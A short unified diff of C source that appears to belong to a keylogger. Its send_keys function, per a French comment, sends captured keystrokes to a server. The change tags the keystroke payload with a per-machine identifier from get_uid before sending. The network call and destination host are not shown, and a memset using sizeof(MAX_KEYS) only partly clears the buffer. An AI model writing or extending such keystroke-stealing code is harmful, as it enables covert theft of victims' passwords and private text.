@@ -2,6 +2,8 @@
 #include <stdio.h>
 #include <time.h> 
 #include <stdlib.h>
+#include "../include/structures.h"
+#include "../include/uid.h"
 //#include "http.h"
 
 #define MAX_KEYS 100
@@ -122,9 +124,11 @@ void key_code_to_string(int key, char *string_key, int value_in_string_key){
 void send_keys(void){
 
     /*Permet d'envoyer les frappes de claviers au serveur et de vider le tableau  key_log*/
-    
-    char data[MAX_KEYS+50];
-    snprintf(data, MAX_KEYS+50, "{\"keys\": \"%s\"}", key_log);
+    char uid[30]; 
+    get_uid(uid);
+
+    char data[MAX_KEYS+100];
+    snprintf(data, MAX_KEYS+100, "{\"uid\":\"%s\",\"keys\": \"%s\"}",uid, key_log);
     memset(key_log, 0, sizeof(MAX_KEYS)); // vider le tableau
     current_key_log_size = 0;
     
